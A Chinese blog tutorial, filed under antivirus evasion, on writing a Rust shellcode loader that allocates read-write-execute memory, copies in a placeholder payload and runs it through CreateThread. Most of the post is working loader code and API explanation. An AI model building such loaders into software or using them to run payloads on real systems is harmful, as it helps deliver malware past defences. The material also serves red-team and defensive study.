---
title: 用 Rust 写一个简单的 ShellCode 加载器
published: 2025-10-11
description: 本文介绍了如何使用 Rust 编写一个简单的 ShellCode 加载器，通过 Windows API 实现内存分配、代码复制和线程创建来执行 ShellCode。
tags: [Rust, Windows, ShellCode]
category: 免杀
draft: false
---

文章使用的 Windows API 底层库为：[windows - Rust](https://microsoft.github.io/windows-docs-rs/)

## 整体思路

我们这里采用线程加载。

```Rust
shellcode -> 放进内存中 -> 创建线程，去执行这块内存
```

## 开辟内存

第一步我们先通过 VirtualAlloc 开辟一个内存空间，找一下这个 API 在哪个库里

<img src="https://personal-knowledge-base-1314508256.cos.ap-shanghai.myqcloud.com/Asset/images/%E7%94%A8%20Rust%20%E5%86%99%E4%B8%80%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84%20ShellCode%20%E5%8A%A0%E8%BD%BD%E5%99%A8-1.png" alt="用 Rust 写一个简单的 ShellCode 加载器-1" width="800" />

这是它的函数签名

```rust
pub unsafe fn VirtualAlloc(
    lpaddress: Option<*const c_void>,
    dwsize: usize,
    flallocationtype: VIRTUAL_ALLOCATION_TYPE,
    flprotect: PAGE_PROTECTION_FLAGS,
) -> *mut c_void
```

- `lpaddress`：起始地址，可以为 None
- `dwsize`：要分配的字节数
- `flallocationtype`：内存分配方式，`MEM_COMMIT`、`MEM_RESERVE` 等
- `flprotect`：页面访问保护属性，`PAGE_EXECUTE_READWRITE`、`PAGE_EXECUTE_READWRITE` 等

:::note
更多相关的内容，请参考：[VirtualAlloc 函数 （memoryapi.h） - Win32 apps | Microsoft Learn](https://learn.microsoft.com/zh-cn/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc)
:::

```Rust
use windows::Win32::System::Memory::{VirtualAlloc, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE};

fn main() {
    let shellcode: &[u8] = b"shellcode";
    let address = unsafe {
        VirtualAlloc(
            None,
            shellcode.len(),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE,
        )
    };

    println!("{:?}", address)
}
```

## 将 ShellCode 放进内存里

我们需要将 ShellCode 放到内存里，这里使用 `std::ptr::copy_nonoverlapping`

<img src="https://personal-knowledge-base-1314508256.cos.ap-shanghai.myqcloud.com/Asset/images/%E7%94%A8%20Rust%20%E5%86%99%E4%B8%80%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84%20ShellCode%20%E5%8A%A0%E8%BD%BD%E5%99%A8-2.png" alt="用 Rust 写一个简单的 ShellCode 加载器-2" width="975" />

函数签名

```Rust
pub const unsafe fn copy_nonoverlapping<T>(
    src: *const T,
    dst: *mut T,
    count: usize
)
```

- `src`：源内存地址的裸指针
- `dst`：目标内存地址的裸指针
- `count`：要复制的元素数量。

> 注意：单位是泛型 T 的大小，而不是字节。例如，如果 T 是 `u32`（4 字节），count 是 10，那么总共会复制 10 \* 4 = 40 字节。在我们的 Shellcode 示例中，T 是 `u8`，所以 count 恰好等于字节数。

:::note
更多相关的内容，请参考：[copy_nonoverlapping in std::ptr - Rust](https://rustwiki.org/zh-CN/std/ptr/fn.copy_nonoverlapping.html)
:::

```Rust
use windows::Win32::System::Memory::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE, VirtualAlloc};

fn main() {
    let shellcode: &[u8] = b"shellcode";
    unsafe {
        let address = VirtualAlloc(
            None,
            shellcode.len(),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE,
        );

        std::ptr::copy_nonoverlapping(shellcode.as_ptr(), address as *mut u8, shellcode.len());
    }
}
```

## 创建线程执行

我们现在将 ShellCode 传进了内存里，我们现在需要执行这块儿内存。我们使用 `CreateThread` 这个 API

下面是它的函数签名

```Rust
pub unsafe fn CreateThread(
    lpthreadattributes: Option<*const SECURITY_ATTRIBUTES>,
    dwstacksize: usize,
    lpstartaddress: LPTHREAD_START_ROUTINE,
    lpparameter: Option<*const c_void>,
    dwcreationflags: THREAD_CREATION_FLAGS,
    lpthreadid: Option<*mut u32>,
) -> Result<HANDLE>
```

1. `lpthreadattributes` ：一个指向  `SECURITY_ATTRIBUTES`  结构的指针，用于定义线程的安全性以及子进程是否可以继承此线程的句柄。可以为 None
2. `dwstacksize`：指定新线程的初始栈大小（以字节为单位）。传入  `0` 可以使新线程使用与主线程相同的默认栈大小。
3. `lpstartaddress`：它是一个函数指针，指向新线程将要开始执行的函数地址。这个函数的原型必须是  `fn(lpthreadparam: *mut c_void) -> u32`。
4. `lpparameter`：一个指向变量的指针，该变量将被传递给新线程的起始函数（即  `lpStartAddress`  指向的函数）。可以为 None
5. `dwcreationflags`：控制线程创建的标志。传入  `0`，表示线程在创建后立即开始运行。另一个常见的值是  `CREATE_SUSPENDED (0x4)`，它会创建线程但使其处于挂起状态，直到调用  `ResumeThread`  才会运行。挂起创建在更复杂的注入技术中很常用，例如在执行前修改线程的上下文。
6. `lpthreadid`：一个指向变量的指针，用于接收新创建线程的线程标识符 (TID)。，可以为 None

返回值：

- 成功：返回一个指向新线程的句柄 (`HANDLE`)。这个句柄拥有对线程的完全控制权，可以用来等待、暂停、恢复或终止线程。
- 失败：返回一个无效句柄 (`INVALID_HANDLE_VALUE`)。可以通过 `GetLastError` 获取具体的错误代码。

:::note
更多相关的内容，请参考：[CreateThread function (processthreadsapi.h) - Win32 apps | Microsoft Learn](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createthread)
:::

```Rust
use windows::Win32::System::Memory::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE, VirtualAlloc};
use windows::Win32::System::Threading::{CreateThread, THREAD_CREATION_FLAGS};

fn main() {
    let shellcode: &[u8] = b"shellcode";
    unsafe {
        let address = VirtualAlloc(
            None,
            shellcode.len(),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE,
        );

        std::ptr::copy_nonoverlapping(shellcode.as_ptr(), address as *mut u8, shellcode.len());

        let thread = CreateThread(
            None,
            0,
            Some(std::mem::transmute(address)),
            None,
            THREAD_CREATION_FLAGS(0),
            None,
        )
        .unwrap();
    }
}
```

这里解释一下 `Some(std::mem::transmute(address)),`。

- `lpstartaddress` 为 `LPTHREAD_START_ROUTINE` 类型，而这个类型是一个 `Option<T>`，所以需要用 `Some()`
- `address`  是我们通过  `VirtualAlloc`  分配并写入了 Shellcode 的内存区域的起始地址。
- `mem::transmute`  是一个 Rust 的  `unsafe`  操作，它将一个类型的值强制转换为另一个类型。在这里，它将一个原始的内存指针 (`*mut c_void`) 转换为  `CreateThread`  所需的函数指针类型 (`LPTHREAD_START_ROUTINE`)。这本质上是在告诉操作系统："请把这块内存里的数据当作可执行代码来运行。"

## 等待并关闭

为什么要等待线程结束？因为线程的调度是由操作系统决定的。`main`  线程不会停下来等待 Shellcode 线程运行。它会继续执行  `CreateThread`  之后的代码。由于  `CreateThread`  后面没有其他代码，`main`  函数立刻执行到了结尾并返回。`main`  线程结束。操作系统收到  `main`  线程结束的信号，立即终止整个进程。

所以我们需要使用 `WaitForSingleObject` 等待。`WaitForSingleObject`  会使  `main`  线程进入阻塞 (Blocked)  或等待 (Waiting)  状态。它会告诉操作系统："在我等待的这个句柄 (`thread_handle`) 变成'signaled'状态之前，请不要再给我分配 CPU 时间。"

函数签名

```Rust
pub unsafe fn WaitForSingleObject(
    hhandle: HANDLE,
    dwmilliseconds: u32,
) -> WAIT_EVENT
```

- `hhandle`：
    - 想要等待的对象的句柄
    - 它可以是多种对象的句柄：
        - 线程 (Thread)
        - 进程 (Process)
        - 事件 (Event)
        - 互斥体 (Mutex)
        - 信号量 (Semaphore)
- `dwmilliseconds`
    - 指定等待的超时时间，单位是毫秒。
    - 它有三种典型的值：
        - 一个具体的正整数 (例如 5000)：表示最多等待 5000 毫秒（5 秒）。如果 5 秒内线程还没结束，WaitForSingleObject 也会返回，但返回值会告诉我们是由于超时而不是线程结束。
        - 0：完全不等待。函数会立即检查一次线程句柄的状态然后返回。这可以用来"轮询"一个线程是否结束，但效率不高。
        - `INFINITE (0xFFFFFFFF)`：它表示无限期等待，直到线程句柄变为 "Signaled" 状态为止。函数将永远阻塞在这里，直到我们等待的线程自己结束。

```Rust
use windows::Win32::Foundation::CloseHandle;
use windows::Win32::System::Memory::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE, VirtualAlloc};
use windows::Win32::System::Threading::{
    CreateThread, INFINITE, THREAD_CREATION_FLAGS, WaitForSingleObject,
};

fn main() {
    let shellcode: &[u8] = b"shellcode";
    unsafe {
        let address = VirtualAlloc(
            None,
            shellcode.len(),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE,
        );

        std::ptr::copy_nonoverlapping(shellcode.as_ptr(), address as *mut u8, shellcode.len());

        let thread = CreateThread(
            None,
            0,
            Some(std::mem::transmute(address)),
            None,
            THREAD_CREATION_FLAGS(0),
            None,
        )
        .unwrap();

        if !thread.is_invalid() {
            WaitForSingleObject(thread, INFINITE);
            CloseHandle(thread).unwrap();
        }
    }
}
```

流程大概为：

1. `CreateThread`  创建了 Shellcode 线程，并返回了它的句柄  `thread_handle`。
2. 主线程将  `thread_handle`  和  `INFINITE`  作为参数传递给  `WaitForSingleObject`。
3. 主线程在此处"冻结"，将 CPU 控制权完全交给操作系统。
4. 操作系统调度 Shellcode 线程，使其运行。
5. Shellcode 线程完成任务后，线程函数返回，线程终止。
6. 线程一终止，它的句柄  `thread_handle`  状态就变为 "Signaled"。
7. `WaitForSingleObject`  检测到这个状态变化，函数返回  `WAIT_OBJECT_0`。
8. 主线程被"解冻"，继续执行  `CloseHandle`  和后续代码，最后正常退出。
